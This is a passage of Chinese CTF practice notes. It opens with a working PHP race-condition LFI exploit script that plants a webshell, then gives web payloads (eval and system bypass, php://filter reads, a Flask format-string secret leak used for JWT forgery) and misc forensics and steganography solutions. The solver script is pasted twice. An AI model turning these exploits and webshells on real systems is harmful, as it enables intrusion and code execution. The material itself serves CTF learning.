        secret = secrets.token_hex(16)
        secret_hash = hashlib.sha1(secret.encode()).hexdigest()

        # 构造第一阶段PHP代码：验证密钥后写入后门
        php_code = (
            f"<?php if(sha1($_GET['s'])==='{secret_hash}')"
            f"file_put_contents(\"{backdoor}\",$_GET['p']);/*"
        ).encode()

        # 添加前缀调整Base64输出，确保最终编码仅含字母数字
        encoded = b"abcdfg" + base64.b64encode(php_code)
        if re.fullmatch(rb"[A-Za-z0-9]+", encoded):
            return backdoor, secret, encoded.decode()
    
    raise RuntimeError("Payload生成失败，请重试")

# 生成核心Payload和后门信息
backdoor, secret, payload_encoded = gen_payload()
# 第二阶段WebShell：验证密钥后执行系统命令
webshell = (
    f"<?php if(sha1($_GET['s'])==='{hashlib.sha1(secret.encode()).hexdigest()}')"
    f"echo shell_exec($_GET['c']);"
)

# 全局状态管理
state = {
    "stop": False,
    "current_pid": 0,
    "flag": None,
}

# 打印初始信息
print(f"[*] 后门文件名: {backdoor}")
print(f"[*] 通信密钥: {secret}")
print(f"[*] 编码Payload: {payload_encoded[:32]}...")

def new_session():
    """创建带默认请求头的会话"""
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    return s

def pid_monitor_worker():
    """持续监控系统最后一个PID，预测下一个进程ID"""
    s = new_session()
    while not state["stop"]:
        try:
            r = s.get(BASE, params={"page": "/proc/sys/kernel/ns_last_pid"}, timeout=2)
            pid_str = r.text.strip()
            if pid_str.isdigit():
                state["current_pid"] = int(pid_str)
        except Exception:
            pass
        time.sleep(0.08)

def reset_trigger_worker():
    """持续触发reset操作，制造文件删除-写入的竞争窗口"""
    s = new_session()
    while not state["stop"]:
        try:
            # 利用reset参数删除Payload文件，触发后续的文件创建流程
            s.get(BASE, params={"page": payload_encoded, "reset": "1"}, timeout=2)
        except Exception:
            pass
        time.sleep(0.01)

def race_include_worker(offset):
    """竞争条件利用Worker，在窗口内包含恶意进程命令行"""
    s = new_session()
    while not state["stop"]:
        target_pid = state["current_pid"] + offset
        if target_pid <= 1:
            time.sleep(0.01)
            continue
        
        try:
            # 核心利用：包含当前PHP进程的cmdline文件并Base64解码
            s.get(
                BASE,
                params={
                    "page": f"php://filter/convert.base64-decode/resource=/proc/{target_pid}/cmdline",
                    "p": webshell,
                    "s": secret,
                },
                timeout=2,
            )
        except Exception:
            pass
        time.sleep(0.005)

def flag_poll_worker():
    """持续轮询后门文件，尝试获取Flag"""
    s = new_session()
    backdoor_url = BASE + "data/" + backdoor
    start_time = time.time()

    while not state["stop"] and time.time() - start_time < 100:
        try:
            r = s.get(
                backdoor_url,
                params={"s": secret, "c": "/readflag"},
                timeout=2
            )
            result = r.text.strip()
            # 检测Flag特征
            if result and ("{" in result or "flag" in result.lower() or "NSSCTF" in result):
                state["flag"] = result
                state["stop"] = True
                print(f"\n[+] 成功获取Flag: {result}")
                return
        except Exception:
            pass
        time.sleep(0.08)

# 启动所有Worker线程
state["stop"] = False
threads = []
threads.append(threading.Thread(target=pid_monitor_worker, daemon=True))
threads.extend([threading.Thread(target=reset_trigger_worker, daemon=True) for _ in range(4)])
threads.extend([threading.Thread(target=race_include_worker, args=(i,), daemon=True) for i in range(1, 33)])
threads.append(threading.Thread(target=flag_poll_worker, daemon=True))

for t in threads:
    t.start()

# 主线程监控运行状态
start_time = time.time()
while not state["stop"] and time.time() - start_time < 110:
    print(f"\r[*] 当前系统PID: {state['current_pid']}", end="")
    time.sleep(5)

# 输出最终结果
print("\n" + "="*50)
if state["flag"]:
    print(f"[✓] 攻击成功！Flag: {state['flag']}")
else:
    print("[-] 攻击失败，未在超时时间内获取Flag，请重试")
```


---
### 以上是难题
### `[SWPUCTF 2022 新生赛]`webdog1__start

```
if (isset($_GET['web']))
{
    $first=$_GET['web'];
    if ($first==md5($first)) 
```

科学计数法绕过弱比较
```
?web=0e215962017
```

```
┌──(root㉿kali)-[~]
└─# curl http://node5.anna.nssctf.cn:24852/robots.txt
哈哈哈，看来你还是有备而来，我的一切财宝都藏在f14g.php里面了，去找吧！ 
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260528224849494.png)

```
<?php
error_reporting(0);
highlight_file(__FILE__);

if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }
}
```

```
?get=eval($_GET[1]);&1=system('cat /flag');
```

这里原本想玩下命令注入长度限制绕过，但发现没有文件写入权限

### `[SWPUCTF 2021 新生赛]`include

```
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
```

这里应该是能用data伪协议的，但可能是ini_set没生效
```
ini_set("allow_url_include","on");
```
这里用php://filter解
```
php://filter/convert.base64-encode/resource=flag.php
```
### `[MoeCTF 2021]`地狱通讯-改

```
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)

# 首页路由
@app.route("/", methods=['GET', 'POST'])
def index():
    # 读取自身代码并返回
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)

    # 获取 name 参数
    name = request.args.get('name') or ''
    
    # 如果 name 包含 admin 或为空，直接返回源码
    if 'admin' in name or name == '':
        return res

    # 生成 JWT token
    payload = {
        "name": name,
    }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    
    # 设置 cookie
    res.set_cookie('token', token)
    return res

# hello 页面路由
@app.route('/hello', methods=['GET', 'POST'])
def hello():
    # 获取 token
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)

    try:
        # 解密 token 获取 name
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"

    # 非 admin 用户
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    
    # admin 用户，返回 flag 页面
    else:
        return render_template('flag.html', name=name)

if __name__ == "__main__":
    app.run()
```

进入直接给了源代码
/路由输入GET参数name获得token
/hello路由获取GET参数flag并用format解析
存在python格式化字符串漏洞，用继承链做

先访问/路由拿token，然后访问/hello拿jwt密钥
```
flag={0.__init__.__globals__[secret]}
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601102804356.png)

```
u_have_kn0w_what_f0rmat_i5
```

jwt.io修改为admin用户访问/hello即可

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601103005401.png)

### `[NSSCTF 2022 Spring Recruit]`ezgame

春季招新赛的题，确实有些简单了

源代码是个游戏，能看到泄露的preload.js，提示需要score超过65给flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134454381.png)

直接找看js源码，搜索score，发现在进行分数判断的上面有明文NSSCTF的flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134252254.png)

这个flag应该隐去的，然后正常流程应该是在控制台直接输入`scorePoint=10000;`然后结束游戏即可拿到flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605134904203.png)

也不需要动调什么的
## misc
### `[SEETF 2023]`1337er Word Search

```
It's a bigger word search. Find the flag hidden in the grid, in any of the eight directions (horizontal, vertical, or diagonal).

flag格式为SEE{}
```

看看这个词表长什么样子
```
<html>
<head>
<title>1337er Word Search</title>
<style>
#grid {
  display: grid;
  grid-template-columns: repeat(16, 1fr);
  list-style: none;
  width: 320px;
  font-family: monospace;
}
li {
	height: 20px;
}
</style>
</head>
<body>
<p>It's a massive word search, but for speed reasons we can only show a 16x16 window at a time. Use the arrow keys to move around.</p>
<ul id="grid" align="center"></ul>
<script>
let x = 3141592653589793n;
let y = 2718281828459045n;

const get=(x,y,n=1337)=>n?dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]:x|y?' ':'0';
const draw=()=>{
	let s = '';
	for (let j = 0n; j < 16n; j++)
		for (let i = 0n; i < 16n; i++)
			s += `<li>${get(x+i,y+j)}</li>`
	grid.innerHTML = s;
};

onkeydown = e => {
	switch (e.keyCode) {
		case 37: x--; break;
		case 38: y--; break;
		case 39: x++; break;
		case 40: y++; break;
		default: return;
	}
	draw();
};

dic={
'0':'nf0u',
'1':'hPMX',
'2':'4Jxl',
'3':'tcCJ',
'4':'4nxn',
'5':'T}Yv',
'6':'oI1C',
'7':'qQ7Y',
'8':'GHJY',
'9':'}Iqi',
'A':'Kwuo',
'B':'BJLI',
'C':'zsRd',
'D':'qCKt',
'E':'IieS',
'F':'tEIS',
'G':'gvJY',
'H':'RG{a',
'I':'N}yE',
'J':'UXje',
'K':'wK}x',
'L':'6QY9',
'M':'RL2b',
'N':'gypL',
'O':'6USu',
'P':'MUBc',
'Q':'muOg',
'R':'BJeS',
'S':'tCCt',
'T':'R2E}',
'U':'snfE',
'V':'3mAY',
'W':'dQbw',
'X':'CmIR',
'Y':'PAKu',
'Z':'NbnS',
'_':'LUfN',
'a':'_JVr',
'b':'ZGhe',
'c':'nrWJ',
'd':'4gNn',
'e':'o9AT',
'f':'Mkuz',
'g':'}BCV',
'h':'SF89',
'i':'QOF4',
'j':'{OrK',
'k':'1LGn',
'l':'5c{K',
'm':'roLg',
'n':'z5Ql',
'o':'CRtc',
'p':'oQxu',
'q':'cFkd',
'r':'y5{g',
's':'J2Fa',
't':'Uigt',
'u':'{R{3',
'v':'bc_u',
'w':'EdZS',
'x':'2mKs',
'y':'_F75',
'z':'85pn',
'{':'u1Vr',
'}':'ywi1',
' ':'    '
}

draw();
</script>
</body>
</html>
```

直接看代码部分

先定义了初始坐标
```
let x = 3141592653589793n;
let y = 2718281828459045n;
```
末尾存在 n 说明是 JavaScript 的 `BigInt` 写法，这里坐标非常大，所以必须用 `BigInt`

```
const get=(x,y,n=1337)=>n?dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]:x|y?' ':'0';
```
这个函数精简了很多，ai改成正常格式看看
```
定义get函数
const get = (x, y, n = 1337) => {
    if (n) {
        let parent = get(x >> 1n, y >> 1n, n - 1);
        let idx = ((y & 1n) << 1n) | (x & 1n);
        return dic[parent][idx];
    } else {
        if (x | y) {
            return ' ';
        } else {
            return '0';
        }
    }
};
```
其作用是返回第n层网络中坐标(x,y)处的字符
先查看递归结束点
```
if (x | y) {
    return ' ';
} else {
    return '0';
}
第 0 层网格只有一个核心字符：
坐标 (0, 0) 是 '0'
其他位置都是空格 ' '
```

然后查看递归部分 n>0
1. 找父层坐标
```
get(x >> 1n, y >> 1n, n - 1)

x >> 1n  等价于 floor(x / 2)
y >> 1n  等价于 floor(y / 2)
```

所以当前层坐标 `(x, y)` 的父层坐标是：
```
(floor(x / 2), floor(y / 2))
```

例如：
```
当前坐标 (6, 9)父层坐标：x >> 1 = 3y >> 1 = 4所以父层是 (3, 4)
```

也就是说，当前层的每个 `2×2` 小块，都来自父层的一个字符

2. 计算当前点在 2×2 块里的位置
```
(y & 1n) << 1n | x & 1n
```
这里用的是最低位。

`x & 1n` 表示 x 是奇数还是偶数：
```
x & 1 = 0  偶数x & 1 = 1  奇数
```

`y & 1n` 也是一样
索引计算：
```
idx = ((y & 1n) << 1n) | (x & 1n)
```
可以得到 0、1、2、3 四种情况。
对应关系是：

|x最低位|y最低位|idx|位置|
|---|---|---|---|
|0|0|0|左上|
|1|0|1|右上|
|0|1|2|左下|
|1|1|3|右下|

所以：
```
idx = 0 取父字符展开后的第 1 个字符
idx = 1 取父字符展开后的第 2 个字符
idx = 2 取父字符展开后的第 3 个字符
idx = 3 取父字符展开后的第 4 个字符
```
3. 根据 dic 做字符替换
dic里有`'0':'nf0u'`这样格式的展开，根据上面的规律进行映射

#### 如何解题

因此这题我们想找flag，需要
```
从某个范围开始扫：  
找 S  
找 E  
找 E  
找 {
```

但是表格太大不可能这样找，因此需要用`get(x,y,n=1337)`递归函数进行反推
```
我希望某几个点分别是 S、E、E、{
反推它们上一层可能是什么字符
再反推上一层的上一层
...
直到第 0 层
```

如果最后能回到：
```
(0,0) = '0'其他地方 = ' '
```

说明这个位置存在

最后代码部分就交给ai了（）
```
import re
import sys

HTML_PATH = sys.argv[1] if len(sys.argv) > 1 else "wordsearch2.html"

PREFIX = "SEE{"
DEPTH = 1337
MAX_FLAG_LEN = 200


def load_dic(path):
    with open(path, "r", encoding="utf-8") as f:
        html = f.read()

    pairs = re.findall(r"'([^']*)'\s*:\s*'([^']*)'", html)
    dic = dict(pairs)

    if not dic:
        raise RuntimeError("没有解析到 dic")

    if "0" not in dic:
        raise RuntimeError("dic 中没有 '0'")

    if " " not in dic:
        raise RuntimeError("dic 中没有空格字符")

    return dic


dic = load_dic(HTML_PATH)
alphabet = tuple(dic.keys())


def get_char(x, y, n=DEPTH):
    """
    等价于原 JS:

    get=(x,y,n=1337)=>n
      ? dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]
      : x|y?' ':'0';

    这里改成迭代版。
    """

    indexes = []

    xx = x
    yy = y

    for _ in range(n):
        idx = ((yy & 1) << 1) | (xx & 1)
        indexes.append(idx)

        xx >>= 1
        yy >>= 1

    if xx | yy:
        c = " "
    else:
        c = "0"

    for idx in reversed(indexes):
        c = dic[c][idx]

    return c


def state_key(state):
    return tuple(sorted(
        (a, b, "".join(sorted(chars)))
        for (a, b), chars in state.items()
    ))


def initial_state(pattern, dx, dy):
    """
    假设 pattern 沿方向 (dx, dy) 出现。

    例如 direction = (-1, 1):

    S 在 (x,   y)
    E 在 (x-1, y+1)
    E 在 (x-2, y+2)
    { 在 (x-3, y+3)
    """

    state = {}

    for i, ch in enumerate(pattern):
        state[(i * dx, i * dy)] = frozenset({ch})

    return state


def transition_from_key(key, rx, ry):
    """
    逆推一层。

    已知当前层某些点的字符约束，
    反推出父层这些点可能是什么字符。
    """

    parent_constraints = {}

    for a, b, chars in key:
        allowed_child_chars = frozenset(chars)

        child_x_parity = (rx + a) & 1
        child_y_parity = (ry + b) & 1

        idx = (child_y_parity << 1) | child_x_parity

        parent_a = (rx + a) // 2
        parent_b = (ry + b) // 2

        parent_constraints.setdefault((parent_a, parent_b), []).append(
            (idx, allowed_child_chars)
        )

    parent_state = {}

    for parent_pos, constraints in parent_constraints.items():
        possible_parent_chars = []

        for parent_char in alphabet:
            ok = True

            for idx, allowed_child_chars in constraints:
                child_char = dic[parent_char][idx]

                if child_char not in allowed_child_chars:
                    ok = False
                    break

            if ok:
                possible_parent_chars.append(parent_char)

        if not possible_parent_chars:
            return None

        parent_state[parent_pos] = frozenset(possible_parent_chars)

    return state_key(parent_state)


def base_ok_key(key):
    """
    第 0 层规则：

    (0,0) 是 '0'
    其他坐标是空格 ' '
    """

    for a, b, chars in key:
        expected = "0" if (a, b) == (0, 0) else " "

        if expected not in chars:
            return False

    return True


def solve_start_for_direction(pattern, dx, dy, depth=DEPTH):
    """
    无递归版逆推。

    返回:
        (x, y)

    找不到则返回 None。
    """

    start_key = state_key(initial_state(pattern, dx, dy))

    failed = set()

    stack = [
        {
            "key": start_key,
            "d": depth,
            "next": 0,
            "choice": None,
        }
    ]

    choices = [
        (0, 0),
        (0, 1),
        (1, 0),
        (1, 1),
    ]

    while stack:
        frame = stack[-1]

        key = frame["key"]
        d = frame["d"]

        if (key, d) in failed:
            stack.pop()
            continue

        if d == 0:
            if base_ok_key(key):
                x = 0
                y = 0

                path = [f["choice"] for f in stack[1:]]

                for rx, ry in reversed(path):
                    x = 2 * x + rx
                    y = 2 * y + ry

                return x, y

            failed.add((key, d))
            stack.pop()
            continue

        if frame["next"] >= len(choices):
            failed.add((key, d))
            stack.pop()
            continue

        rx, ry = choices[frame["next"]]
        frame["next"] += 1

        parent_key = transition_from_key(key, rx, ry)

        if parent_key is None:
            continue

        if (parent_key, d - 1) in failed:
            continue

        stack.append(
            {
                "key": parent_key,
                "d": d - 1,
                "next": 0,
                "choice": (rx, ry),
            }
        )

    return None


def read_until_end(x, y, dx, dy, max_len=MAX_FLAG_LEN):
    """
    找到 SEE{ 的起点后，沿方向正向读取完整 flag。
    """

    result = []

    for i in range(max_len):
        xx = x + i * dx
        yy = y + i * dy

        c = get_char(xx, yy)
        result.append(c)

        if c == "}" and i >= 3:
            break

    return "".join(result)


def main():
    directions = [
        (1, 0),      # 右
        (-1, 0),     # 左
        (0, 1),      # 下
        (0, -1),     # 上
        (1, 1),      # 右下
        (1, -1),     # 右上
        (-1, 1),     # 左下
        (-1, -1),    # 左上
    ]

    for dx, dy in directions:
        print("[*] trying direction:", (dx, dy))

        start = solve_start_for_direction(PREFIX, dx, dy)

        if start is None:
            continue

        x, y = start
        candidate = read_until_end(x, y, dx, dy)

        if candidate.startswith(PREFIX):
            print("[+] found")
            print("direction:", (dx, dy))
            print("start:", (x, y))
            print("flag:", candidate)


if __name__ == "__main__":
    main()import re
import sys

HTML_PATH = sys.argv[1] if len(sys.argv) > 1 else "wordsearch2.html"

PREFIX = "SEE{"
DEPTH = 1337
MAX_FLAG_LEN = 200


def load_dic(path):
    with open(path, "r", encoding="utf-8") as f:
        html = f.read()

    pairs = re.findall(r"'([^']*)'\s*:\s*'([^']*)'", html)
    dic = dict(pairs)

    if not dic:
        raise RuntimeError("没有解析到 dic")

    if "0" not in dic:
        raise RuntimeError("dic 中没有 '0'")

    if " " not in dic:
        raise RuntimeError("dic 中没有空格字符")

    return dic


dic = load_dic(HTML_PATH)
alphabet = tuple(dic.keys())


def get_char(x, y, n=DEPTH):
    """
    等价于原 JS:

    get=(x,y,n=1337)=>n
      ? dic[get(x>>1n,y>>1n,n-1)][(y&1n)<<1n|x&1n]
      : x|y?' ':'0';

    这里改成迭代版。
    """

    indexes = []

    xx = x
    yy = y

    for _ in range(n):
        idx = ((yy & 1) << 1) | (xx & 1)
        indexes.append(idx)

        xx >>= 1
        yy >>= 1

    if xx | yy:
        c = " "
    else:
        c = "0"

    for idx in reversed(indexes):
        c = dic[c][idx]

    return c


def state_key(state):
    return tuple(sorted(
        (a, b, "".join(sorted(chars)))
        for (a, b), chars in state.items()
    ))


def initial_state(pattern, dx, dy):
    """
    假设 pattern 沿方向 (dx, dy) 出现。

    例如 direction = (-1, 1):

    S 在 (x,   y)
    E 在 (x-1, y+1)
    E 在 (x-2, y+2)
    { 在 (x-3, y+3)
    """

    state = {}

    for i, ch in enumerate(pattern):
        state[(i * dx, i * dy)] = frozenset({ch})

    return state


def transition_from_key(key, rx, ry):
    """
    逆推一层。

    已知当前层某些点的字符约束，
    反推出父层这些点可能是什么字符。
    """

    parent_constraints = {}

    for a, b, chars in key:
        allowed_child_chars = frozenset(chars)

        child_x_parity = (rx + a) & 1
        child_y_parity = (ry + b) & 1

        idx = (child_y_parity << 1) | child_x_parity

        parent_a = (rx + a) // 2
        parent_b = (ry + b) // 2

        parent_constraints.setdefault((parent_a, parent_b), []).append(
            (idx, allowed_child_chars)
        )

    parent_state = {}

    for parent_pos, constraints in parent_constraints.items():
        possible_parent_chars = []

        for parent_char in alphabet:
            ok = True

            for idx, allowed_child_chars in constraints:
                child_char = dic[parent_char][idx]

                if child_char not in allowed_child_chars:
                    ok = False
                    break

            if ok:
                possible_parent_chars.append(parent_char)

        if not possible_parent_chars:
            return None

        parent_state[parent_pos] = frozenset(possible_parent_chars)

    return state_key(parent_state)


def base_ok_key(key):
    """
    第 0 层规则：

    (0,0) 是 '0'
    其他坐标是空格 ' '
    """

    for a, b, chars in key:
        expected = "0" if (a, b) == (0, 0) else " "

        if expected not in chars:
            return False

    return True


def solve_start_for_direction(pattern, dx, dy, depth=DEPTH):
    """
    无递归版逆推。

    返回:
        (x, y)

    找不到则返回 None。
    """

    start_key = state_key(initial_state(pattern, dx, dy))

    failed = set()

    stack = [
        {
            "key": start_key,
            "d": depth,
            "next": 0,
            "choice": None,
        }
    ]

    choices = [
        (0, 0),
        (0, 1),
        (1, 0),
        (1, 1),
    ]

    while stack:
        frame = stack[-1]

        key = frame["key"]
        d = frame["d"]

        if (key, d) in failed:
            stack.pop()
            continue

        if d == 0:
            if base_ok_key(key):
                x = 0
                y = 0

                path = [f["choice"] for f in stack[1:]]

                for rx, ry in reversed(path):
                    x = 2 * x + rx
                    y = 2 * y + ry

                return x, y

            failed.add((key, d))
            stack.pop()
            continue

        if frame["next"] >= len(choices):
            failed.add((key, d))
            stack.pop()
            continue

        rx, ry = choices[frame["next"]]
        frame["next"] += 1

        parent_key = transition_from_key(key, rx, ry)

        if parent_key is None:
            continue

        if (parent_key, d - 1) in failed:
            continue

        stack.append(
            {
                "key": parent_key,
                "d": d - 1,
                "next": 0,
                "choice": (rx, ry),
            }
        )

    return None


def read_until_end(x, y, dx, dy, max_len=MAX_FLAG_LEN):
    """
    找到 SEE{ 的起点后，沿方向正向读取完整 flag。
    """

    result = []

    for i in range(max_len):
        xx = x + i * dx
        yy = y + i * dy

        c = get_char(xx, yy)
        result.append(c)

        if c == "}" and i >= 3:
            break

    return "".join(result)


def main():
    directions = [
        (1, 0),      # 右
        (-1, 0),     # 左
        (0, 1),      # 下
        (0, -1),     # 上
        (1, 1),      # 右下
        (1, -1),     # 右上
        (-1, 1),     # 左下
        (-1, -1),    # 左上
    ]

    for dx, dy in directions:
        print("[*] trying direction:", (dx, dy))

        start = solve_start_for_direction(PREFIX, dx, dy)

        if start is None:
            continue

        x, y = start
        candidate = read_until_end(x, y, dx, dy)

        if candidate.startswith(PREFIX):
            print("[+] found")
            print("direction:", (dx, dy))
            print("start:", (x, y))
            print("flag:", candidate)


if __name__ == "__main__":
    main()
```

把源码和代码放同一目录然后运行
```
HTML_PATH = "wordsearch2.html"
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603225816303.png)
### `[SEETF 2022]`Sniffed Traffic

```
We inspected our logs and found someone downloading a file from a machine within the same network.

Can you help find out what the contents of the file are?
```
下载了某个文件
直接看文件->导出对象->HTTP发现zip文件

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601105338943.png)

弄下来发现有加密，不是伪加密且爆破失败，再看看流量

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601105452322.png)

筛选一下ip再追踪tcp流，发现某次对话里有密码

解压后得到stuff文件，010查看发现压缩包文件

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601105617304.png)

提取后发现也有密码，爆破得到john，里面既是flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601105727675.png)

### `[HZNUCTF 2023 preliminary]`picture
```
这颜色怎么怪怪的
得到的flag请使用NSSCTF{}格式提交
```

附件是图片，这题虽然考的是lsb
但是直接放随波逐流里是看不出来的

使用zsteg爆破lsb能看到 `b8,rgb,lsb,xy`
```
zsteg -a png
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260529194945761.png)

导出图片
```
zsteg -e b8,rgb,lsb,xy png ->out.png
```

这里用zsteg爆破就看到隐藏内容了，因为这个不在zsteg的组合里
用stegsolve在 rgb 的plane1通道看到顶端有色块

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260529195221425.png)

能再提取出一张png图片

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260529195824944.png)

新图片为二维码，扫码得到flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260529195838176.png)

### `[GDOUCTF 2023]`t3stify

附件是wav文件

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601174141427.png)

文件尾能看到一段字符，base64解密得到提示是deepsound

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601174255886.png)

放软件里能识别出有DeepSound加密，但是需要密码

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173416466.png)

audition没看出什么，双声道音频，可能是左右声道差分
```python
import scipy.io.wavfile as wav
import numpy as np 
import matplotlib.pyplot as plt

sample_rate, data = wav.read('flagg.wav')

left = data[:, 0::2] 
right = data[:, 1::2]

diff = np.abs(left - right)

plt.plot(diff)
plt.show()
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173856618.png)

中间明显有不同，放大细看可以看出基本是两种宽度，试试摩斯或者二进制

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173945813.png)

二进制转ascii有不可读字符
```
.- .-. -.-. .- . .- .---- ..-. .---- . ...-- ...--
```
摩斯能转出明文
```
ARCAEA1F1E33
```

然后用deepsound工具解密就行了

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173341219.png)

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260601173150513.png)

### `[NCTF 2018]`I wanna play CTF

```
这是一道肥宅快乐题，做题太累了可以玩玩，还能拿Flag
Engine: I wanna be the engine yuuutu edition
Background Images:
~ Pixiv 13534647, 44526375, 47998893, 51613650, 55647411, 37940221
BGM:
~ 幻想機動要塞　- Falcom Sound Team jdk
~ 行き着く先　Instrumental ver. - Falcom Sound Team jdk
TIP: 出题组的挑战时间：
MozhuCY：173 Death，0:37:05
Homura: 976 Death, 1:43:21
得到的flag使用NSSCTF{}格式提交。
```

ida查看能看到是GameMarker8编译的游戏，直接使用 GM8Decompiler 反编译出原始 GMK文件

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093050686.png)

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093132148.png)

把gmk放到GM8里查看9个房间图片集齐flag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260604093331316.png)

```
nctf{pl4y1Ng_C7f_c4n_b3coMe_5Tr0n93r}
```